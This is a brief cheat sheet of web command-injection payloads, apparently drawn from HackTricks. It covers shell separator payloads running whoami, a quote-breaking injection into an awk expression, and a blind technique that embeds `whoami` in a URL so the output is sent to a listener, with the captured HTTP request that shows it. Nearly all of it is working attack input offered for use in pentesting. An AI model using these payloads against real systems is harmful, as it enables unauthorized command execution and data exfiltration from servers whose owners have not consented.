[https://book.hacktricks.xyz/pentesting-web/command-injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
**Payloads**
```Python
; whoami
```
```Python
; whoami ;
```
```Python
; whoami ; #
```
**Close logic via our controlled input, then execute**
```Python
 awk 'BEGIN {print sqrt(((-2)^2) + ((-3)^2))}'
```
```Python
3)^2))}';whoami;#
```
### Blind
```Python
http://LOCALIP>:PORT/?=`whoami`
```
Response on listening server:
```Python
HEAD /?=www-data HTTP/1.1
```
